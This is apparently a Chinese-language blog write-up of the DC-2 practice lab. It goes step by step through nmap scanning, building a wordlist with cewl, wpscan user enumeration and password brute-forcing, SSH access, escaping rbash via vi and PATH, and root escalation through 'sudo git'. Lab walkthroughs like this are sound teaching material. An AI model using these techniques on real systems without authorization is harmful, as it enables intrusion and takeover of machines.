---
title: DC-2靶场练习
date: 2021-12-20 14:10:26
tags: DC靶场系列
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-48ged1_1920x1080.png
---

# DC-2靶场练习

## 练习环境

kali:192.168.10.128

靶机dc-2:192.168.10.184(假装不知道)

## 练习开始

先用nmap找一下靶机的IP和端口：

```
nmap 192.168.10.0/24
```

![image-20211220141827545](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220141827545.png)

扫出靶机，IP：192.168.10.184

这里只发现开了个80端口，很可疑，有猫腻，换条命令试试：

```
nmap -A -p 1-65535 192.168.10.184
```

![image-20211220142242781](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220142242781.png)

果然有猫腻：隐藏了ssh服务的7744端口

先去web端看看：`http://192.168.10.184`

![image-20211220142637899](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220142637899.png)

它会自动跳转到dc-2,似乎被重定向了

修改一下hosts文件就行了

```
vim /etc/hosts
```

加上`192.168.10.184 dc-2` 保存即可

![image-20211220143420812](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143420812.png)

重新打开web端，成功打开网站

并发现flag

![image-20211220143713228](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143713228.png)



打开flag,得到：

![image-20211220143819425](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143819425.png)

这里似乎在暗示我用cewl这个工具

> cewl是一个ruby应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。cewl还有一个相关的命令行工具应用FAB，它使用相同的元数据提取技术从已下载的列表中创建作者/创建者列表。



```
cewl http://dc-2 -w 1.txt
```

得到字典：

![image-20211220145059991](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220145059991.png)

这是密码字典，缺用户名

再查看一下CMS

![image-20211220145810241](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220145810241.png)

该网站的CMS为WordPress

可以使用wpscan

> WPScan 是 Kali Linux 默认自带的一款漏洞扫描工具，它采用 Ruby 编写，能够扫描 WordPress 网站中的多种安全漏洞，其中包括 WordPress 本身的漏洞、插件漏洞和主题漏洞。最新版本 WPScan 的数据库中包含超过 18000 种插件漏洞和 2600 种主题漏洞，并且支持最新版本的 WordPress。值得注意的是，它不仅能够扫描类似 robots.txt 这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。
>

首次打开，我们可以先更新其漏洞库

```
wpscan -updata
```

扫描站点，枚举用户名

```
wpscan --url http://dc-2/ -e u  
```

![image-20211220151051089](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220151051089.png)

得到三个用户，保存在user.txt中

![image-20211220151536633](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220151536633.png)



下一步就是爆破

```
wpscan --url http://dc-2 -U user.txt -P 1.txt  
```

![image-20211220155104164](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220155104164.png)



两个用户的密码都出来了

* jerry / adipiscing 

* tom / parturient 



扫描目录：

```
dirb http://192.168.10.184
```

![image-20211220155925923](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220155925923.png)

得到后台登录地址：

![image-20211220160036875](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160036875.png)

用jerry / adipiscing 登录一下

登录成功

![image-20211220160359443](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160359443.png)

找到flag2

![image-20211220160449145](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160449145.png)

用tom / parturient 登录，没发现什么有用的东西



根据flag2的提示

![image-20211220161221589](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161221589.png)

我想起了还有个端口没利用，7744端口，ssh服务

```
ssh tom@192.168.10.184 -p 7744 
```

![image-20211220161606583](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161606583.png)

在目录下发现flag3.txt,但是查看不了

![image-20211220161918062](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161918062.png)

-rbash是受限制的命令，但是-rbash是可以绕过

用以下命令查询可用命令：

```
compgen -c 
```

![image-20211220164132234](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220164132234.png)

发现`vi`可以使用

```
vi flag3.txt
```

![image-20211220164303545](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220164303545.png)

”可怜的老汤姆总是追着杰瑞。 也许他应该为他造成的所有压力而苏醒“

这里似乎没有了思路，但是打靶机的还有一个重要步骤没有做，那就是提权

因为`vi`可以使用，那就用这个提权了,提权步骤如下

```
vi flag3.txt
:set shell=/bin/sh
:shell
```



![image-20211220180600050](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180600050.png)

![image-20211220180634523](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180634523.png)

![image-20211220180658690](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180658690.png)

到这里，只能说提权了，但没有完全提权，还是有些命令不能用

`cd`是可以使用的，可以去其他目录看看

![image-20211220181019773](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181019773.png)

返回上一级目录，发现jerry和tom

在jerry里面找到了flag4.txt

![image-20211220181211673](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181211673.png)

 ```
 vi flag4.txt
 ```

![image-20211220181341437](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181341437.png)

```
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

从`but you're not home yet.`可知，我们下一步要去到root目录

但是没有访问权限

![image-20211220182133205](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220182133205.png)

还需要进一步提权



用jerry的账号登录看看，有啥可以用的命令，结果登录不上

![image-20211220183011255](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220183011255.png)

只能回到tom的账号

现在主要是`rbash`限制了我们的操作，如果能绕过就好了



百度走一波，找到rbash的绕过方法，步骤如下：

在刚才的部分提权成功的基础上，在进行下面的命令

```
export PATH=/usr/sbin:/usr/bin:/sbin:/bin  //配置环境变量，成功绕过shell
```



![image-20211220192344498](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220192344498.png)

这里已经绕过了rbash了,很多常用的命令可以用了

或者用这个方法:

```
BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`
export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出
export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出
```

![image-20211220193814982](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220193814982.png)

## 提权：

这里尝试用suid提权:利用拥有suid的文件执行命令，从而提升权限至root

先查看有哪些可以利用的命令：

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20211220194330547](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220194330547.png)

发现有sudo和su，看看有sudo权限的

```
sudo -l
```

![image-20211220194650691](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220194650691.png)

这一波，只能说是意料之中的，要不然jerry这个用户就没啥用了，

切换到jerry这个用户

```
su jerry
```

然后

```
sudo -l
```

![image-20211220195945974](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220195945974.png)

可以看到可以用root执行git

用git提权：

```
sudo git help config
进入页面后输入
!/bin/bash
```

![image-20211220200157116](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200157116.png)

提权成功

![image-20211220200330185](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200330185.png)

找flag

进入root，里面有个final-flag.txt



![image-20211220200535155](https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200535155.png)

完美结束！
